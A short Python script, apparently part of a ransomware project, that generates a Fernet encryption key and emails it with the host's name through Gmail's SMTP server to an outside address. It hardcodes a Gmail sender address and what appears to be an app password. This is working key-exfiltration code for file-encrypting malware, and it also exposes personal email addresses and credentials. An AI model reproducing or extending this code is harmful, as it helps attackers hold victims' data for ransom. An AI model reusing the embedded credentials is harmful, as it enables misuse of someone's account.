import smtplib
import socket
import base64
from cryptography.fernet import Fernet

key = ''

def generate_key():
    key = Fernet.generate_key()
    encoded_key = base64.b64encode(key).decode('utf-8')
    print(key)
    receiver_email = "AnhLSH.B21AT027@stu.ptit.edu.vn"
    subject = socket.gethostname()
    email = "lesyhoanganh2503@gmail.com"

    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, 'lzwr yphs wbot gwci')
    msg = "Key for {}".format(encoded_key) + "\nDeviceName: {}".format(subject)
    server.sendmail(email, receiver_email, msg)
    print("Email sent successfully!")

generate_key()